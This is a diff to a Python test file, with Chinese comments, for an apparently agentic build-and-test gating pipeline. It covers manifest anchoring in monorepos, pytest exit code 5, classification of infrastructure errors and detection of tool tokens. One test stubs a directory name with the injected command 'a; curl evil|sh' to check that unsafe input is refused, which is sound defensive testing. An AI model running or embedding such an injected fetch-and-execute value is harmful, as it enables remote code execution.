@@ -119,7 +119,8 @@ _XH2_CASES = [
                        "src/a.ts": "x", "src/__tests__/a.test.ts": "x"},
      ["src/a.ts"], "npm test --silent"),
     ("rust", {"Cargo.toml": "[package]", "src/lib.rs": "x"},
-     ["src/lib.rs"], "cargo test --offline -q"),
+     # 复核 HIGH-1：不加 `--offline`——冷沙箱里它必失败，且那句报错会被判成**代码错**
+     ["src/lib.rs"], "cargo test -q"),
     ("py-scoped", {"pyproject.toml": "[project]", "app/a.py": "x",
                    "tests/test_a.py": "x"},
      ["app/a.py"], "python -m pytest -q tests/test_a.py"),
@@ -386,6 +387,9 @@ def test_xh1_cross_stack_pollution_anchors_to_manifest_dir(name, files, mods, wa
 def test_xh1_unsafe_manifest_dir_is_refused(tmp_path, monkeypatch, caplog):
     """目录名来自工程树（外部输入）⇒ 形态不安全就不拼进 shell 命令（S-5 同源判据）。"""
     import logging
+    # 锚点现在由 `_manifest_dir_for`（据 modified 反查）给出，故打桩它
+    monkeypatch.setattr(lp, "_manifest_dir_for",
+                        lambda mods, names, pp, evidence=None: "a; curl evil|sh")
     monkeypatch.setattr(lp, "_manifest_dir", lambda names, pp: "a; curl evil|sh")
     root = _tree(tmp_path, {"go.mod": "module x", "m.go": "package main"})
     with caplog.at_level(logging.WARNING):
@@ -560,3 +564,180 @@ def test_c1_php_gate_shape_without_requiring_php_installed(tmp_path):
     assert "git ls-files" not in cmd, "仍依赖 git（沙箱 /workspace 不是 git 仓库）"
     assert "for f in" in cmd and "|| exit 1" in cmd, "不是逐文件检查 ⇒ 只会查第一个"
     assert "a.php" in cmd and "b.php" in cmd, "改动文件没全进命令"
+
+
+# ══════════════════════════════════════════════
+# hunter 复核整改（CRITICAL-1/2、HIGH-1/2/3、MED-1/2/3）
+# ══════════════════════════════════════════════
+
+def test_hc1_anchor_comes_from_modified_not_shortest_manifest(tmp_path):
+    """★复核 CRITICAL-1★ 锚点原按"全树最短清单路径"挑，**完全不看 `modified` 在哪**。
+    实测（沙箱分支＝生产路径）：monorepo `backend/pyproject.toml`，改 `scripts/deploy.py`
+    （真语法错）→ `cd backend && compileall` → **rc=0** ⇒ 改动文件根本没进编译面＝静默假过。
+    python 改前没分支（留 `build_skipped` 痕）、go 改前在根上跑会**大声失败**（可重试）——
+    锚定把"响的失败"换成了"静默的通过"，方向反了。
+    """
+    import subprocess
+    import sys as _sys
+    root = _tree(tmp_path, {"backend/pyproject.toml": "[project]",
+                            "backend/ok.py": "x = 1\n",
+                            "scripts/deploy.py": "def f(\n"})     # 真语法错，在锚点之外
+    cmd = lp._derive_full_build_command(str(root), ["scripts/deploy.py"], None)
+    assert not cmd.startswith("cd backend"), "锚到了与改动无关的子树"
+    r = subprocess.run(["sh", "-c", cmd.replace("python3", _sys.executable)],
+                       cwd=root, capture_output=True)
+    assert r.returncode != 0, "改动文件的语法错没被抓到 ⇒ 闸跑了也是白跑"
+    # 反向臂：改动**在**锚点之内时必须精确锚定（别为了覆盖面把锚定整个放弃）
+    (root / "backend" / "bad.py").write_text("def g(\n")
+    cmd2 = lp._derive_full_build_command(str(root), ["backend/bad.py"], None)
+    assert cmd2.startswith("cd backend &&"), f"该锚定时没锚定: {cmd2!r}"
+
+
+def test_hc1_go_anchor_follows_the_changed_module(tmp_path):
+    """双模块仓：改 `tools/` 就该锚 `tools`，不该按路径长度挑 `svc`。"""
+    root = _tree(tmp_path, {"svc/go.mod": "module svc", "svc/a.go": "package svc",
+                            "tools/go.mod": "module tools", "tools/b.go": "package tools"})
+    assert lp._derive_full_build_command(str(root), ["tools/b.go"], None) \
+        == "cd tools && go build ./..."
+    assert lp._derive_full_build_command(str(root), ["svc/a.go"], None) \
+        == "cd svc && go build ./..."
+
+
+def test_hc1_changes_spanning_two_manifests_fall_back_to_root(tmp_path, caplog):
+    """改动跨多个清单目录 → **不猜**锚点，退根级 + 留 WARNING（否则静默只覆盖一半）。"""
+    import logging
+    root = _tree(tmp_path, {"svc/go.mod": "module svc", "svc/a.go": "package svc",
+                            "tools/go.mod": "module tools", "tools/b.go": "package tools"})
+    with caplog.at_level(logging.WARNING):
+        cmd = lp._derive_full_build_command(str(root), ["svc/a.go", "tools/b.go"], None)
+    assert cmd == "go build ./...", f"跨清单时不该锚到某一个: {cmd!r}"
+    assert any("跨多个" in r.message for r in caplog.records)
+
+
+def test_hc2_test_fallback_is_anchored(tmp_path):
+    """★复核 CRITICAL-2★ 工程级测试兜底原先**不锚定**，而在场探针刚被改成递归 ⇒
+    `backend/pyproject.toml` 形态得到**根级** pytest ⇒ 收集不到用例 rc=5 ⇒ 非 infra ⇒
+    **硬 FAIL**（sticky，换模型同死）。改前只看根 → 返 None → `test_skipped`，
+    所以这是本批新造的判死面。"""
+    root = _tree(tmp_path, {"backend/pyproject.toml": "[project]", "backend/a.py": "x=1"})
+    assert lp._guess_test_cmd(str(root), ["backend/a.py"]) \
+        == "cd backend && python -m pytest -q --maxfail=1"
+    go = _tree(tmp_path / "g", {"tools/go.mod": "module t", "tools/a.go": "package t"})
+    assert lp._guess_test_cmd(str(go), ["tools/a.go"]) == "cd tools && go test ./..."
+
+
+def test_hc2_pytest_no_tests_collected_is_not_a_failure(tmp_path, monkeypatch):
+    """pytest 的 rc=5 是"**一个用例都没收集到**"，按 pytest 自己的约定不是失败。
+    猜出的命令跑在没有用例的目录上会拿到 rc=5 ⇒ 旧判据判成代码失败且 **sticky**。"""
+    from swarm.types import FileScope, SubTask, SubTaskDifficulty, TaskHarness
+    root = _tree(tmp_path, {"pyproject.toml": "[project]", "app/a.py": "x=1\n"})
+    monkeypatch.setattr(lp, "_compile_files", lambda *a, **k: (True, "ok"))
+    monkeypatch.setattr(lp, "_derive_full_build_command", lambda *a, **k: "")
+    monkeypatch.setattr(lp, "_build_cmd_applicable", lambda *a, **k: True)
+    monkeypatch.setattr(lp, "_run_l1_command",
+                        lambda cmd, pp, timeout=120: (5, "no tests ran in 0.01s"))
+    monkeypatch.setenv("SWARM_WORKER_L1_LINT", "false")
+    monkeypatch.setenv("SWARM_WORKER_L1_FORMAT", "false")
+    diff = "--- a/app/a.py\n+++ b/app/a.py\n@@ -1 +1 @@\n-old\n+new\n"
+    st = SubTask(id="st-rc5", description="rc5", difficulty=SubTaskDifficulty.MEDIUM,
+                 scope=FileScope(writable=["app/a.py"]),
+                 harness=TaskHarness(language="python", test_command="pytest -q"))
+    ok, details = lp.run_l1_pipeline(str(root), st, diff, timeout=30)
+    assert ok is True, f"rc=5 被判成失败: {details}"
+    assert details.get("test_no_tests_collected"), "rc=5 的归类没留机读账"
+
+
+_H1_INFRA = [
+    ("cargo 冷沙箱 offline",
+     "error: attempting to make an HTTP request, but --offline was specified"),
+    ("node 连不上 DB", "Error: connect ECONNREFUSED 127.0.0.1:5432"),
+    ("缺 chromium", "Failed to launch the browser process! /ms-playwright/chrome not found"),
+    ("go 无 main module", "go: cannot find main module, but found .git/config"),
+    ("npm 缺脚本", 'npm ERR! Missing script: "test"'),
+]
+
+
+@pytest.mark.parametrize("label,txt", _H1_INFRA, ids=[c[0] for c in _H1_INFRA])
+def test_h1_new_death_surface_classified_as_infra(label, txt):
+    """★复核 HIGH-1★ 本批给 go/rust/npm 新增了**真跑测试**的面（改前一律 `test_skipped`＝通过），
+    而这几类失败**不是代码能力问题**——原表一条都没覆盖（实测全判 CODE）⇒ 会误换模型/烧修复轮。"""
+    assert lp._is_infra_failure(txt) is True, f"{label} 被判成代码错"
+
+
+def test_h1_real_test_failure_still_counts_as_code():
+    """反向臂：真测试失败不许被 infra 化（否则闸没牙）。"""
+    assert lp._is_infra_failure("FAIL src/a.test.ts > sums\nAssertionError: 1 != 2") is False
+
+
+def test_h2_sandbox_find_prunes_dependency_trees():
+    """★复核 HIGH-2★ M-3 的"两探针同口径"当初**只落在本地兜底**，而**生产＝沙箱**：三处沙箱
+    `find` 一次都没有排除表 ⇒ `node_modules/**` 里深度≤3 的清单仍让 `has()` 判 True 且
+    `_manifest_dir` 指进依赖树 ⇒ `cd node_modules/foo && dotnet build` ⇒ 127 → BLOCKED。
+    本条断言三处沙箱分支都带上了剪枝（结构断言，因为无 live 沙箱可跑）。"""
+    import inspect
+    for fn in (lp._manifest_present, lp._manifest_dir, lp._build_cmd_applicable):
+        src = inspect.getsource(fn)
+        if "find " in src:
+            assert "_FIND_PRUNE" in src, f"{fn.__name__} 的沙箱 find 没剪依赖树"
+    assert "node_modules" in lp._FIND_PRUNE and "site-packages" in lp._FIND_PRUNE
+
+
+def test_h3_build_cmd_applicable_shares_one_implementation(tmp_path):
+    """★复核 HIGH-3★ `_build_cmd_applicable` 的本地兜底原是 `any(root.rglob(m))`：
+    **无深度上限、无排除表**，与刚对齐的 `_manifest_present` **反向分叉**。实测深度 7 的
+    `pom.xml` 让它判适用 → 在根上跑 mvn → 127 → BLOCKED（本批要杀的死循环，漏了这一个调用点）。"""
+    deep = _tree(tmp_path, {"a/b/c/d/e/f/g/pom.xml": "<project/>"})
+    assert lp._manifest_present(("pom.xml",), str(deep)) is False
+    assert lp._build_cmd_applicable("mvn -q compile", str(deep)) is False, \
+        "两处口径又分叉了（深度上限不一致）"
+    nm = _tree(tmp_path / "nm", {"node_modules/x/Vendored.csproj": "<Project/>"})
+    assert lp._build_cmd_applicable("dotnet build", str(nm)) is False, "依赖树里的清单算数了"
+
+
+_MED_TOKENS = [
+    ('for f in a.php; do php -l "$f" || exit 1; done', "php"),
+    ('for f in a.rb b.rb; do ruby -c "$f" || exit 1; done', "ruby"),
+    ("cd mvn && npm ci", "npm"),
+    ("cd dotnet && npm run build", "npm"),
+    ("cd sub&&dotnet build", "dotnet"),
+    ("sh -c 'mvn -q compile'", "mvn"),
+    ('bash -c "dotnet build"', "dotnet"),
+    ("env FOO=1 mvn -q compile", "mvn"),
+    ("sudo mvn -q compile", "mvn"),
+    ("mvn -q compile", "mvn"),
+]
+
+
+@pytest.mark.parametrize("cmd,want", _MED_TOKENS, ids=[c[0][:26] for c in _MED_TOKENS])
+def test_med123_effective_tool_token(cmd, want):
+    """★复核 MED-1/2/3★
+    · MED-1 shell 控制结构不是工具：本批自产的 `for f in …; do php -l …` 原先返 `for`
+      ⇒ 每个 PHP/Ruby 子任务刷一条"请登记 `for`"的 WARNING，污染本批自己新建的告警通道（自伤）。
+      循环**变量名**也要跳（只跳 `for` 会返 `f`）。
+    · MED-2 **位置真相优先**：`cd` 的实参永远是路径，哪怕它叫 `mvn`。原实现"宁选表里有的词元"
+      ⇒ `cd mvn && npm ci` → tool=`mvn` ⇒ node 工程无 pom ⇒ 判不适用 ⇒ 跳过即通过（fail-open）。
+    · MED-3 `&&` 紧贴时按分隔符切开（原只按空白 split ⇒ `cd sub&&dotnet build` 得到 `build`）。
+    · 另：`sh -c "<cmd>"` 与 `cd <dir>` 的后续词元语义**不同**——前者就是命令，后者是路径。
+      整改过程中把两者混为一谈，让 `sh -c 'mvn …'` 里的 mvn 被当实参跳过（本条的 sh/bash 用例锁它）。
+    """
+    assert lp._effective_tool_token(cmd.split()) == want
+
+
+_INFRA_MUST_NOT_MATCH = [
+    ("python 缺内部模块", "ModuleNotFoundError: No module named 'app.services.user'"),
+    ("java 缺包", "[ERROR] package com.acme.x does not exist"),
+    ("go 缺内部包", "a.go:7:2: no required module provides package github.com/x/y"),
+    ("ts 缺模块", "src/app.ts(3,24): error TS2307: Cannot find module './routes/users'"),
+    ("rust 未解析 import", "error[E0432]: unresolved import `crate::svc`"),
+]
+
+
+@pytest.mark.parametrize("label,txt", _INFRA_MUST_NOT_MATCH,
+                         ids=[c[0] for c in _INFRA_MUST_NOT_MATCH])
+def test_infra_markers_do_not_swallow_missing_internal_symbols(label, txt):
+    """★整改中自伤，本仓测试当场抓到★ 我为 HIGH-1 加的 node 错误码是**裸子串**：
+    `enotfound` 命中 Python 的 `ModuleNotFoundError`（小写后 `modul·enotfound·error`）
+    ⇒ "缺内部模块"被判成 infra ⇒ **X-C3 的 BLOCKED 归因整条失效**（等生产者的通道没了）。
+    这正是本会话记过的"加 token 前先估它在真实语料里的命中面积"。
+    本条把五个栈的"缺内部标识"形态钉死为**非 infra**——它们必须走 X-C3 的归因链。"""
+    assert lp._is_infra_failure(txt) is False, f"{label} 被 infra 化 ⇒ X-C3 归因链失效"
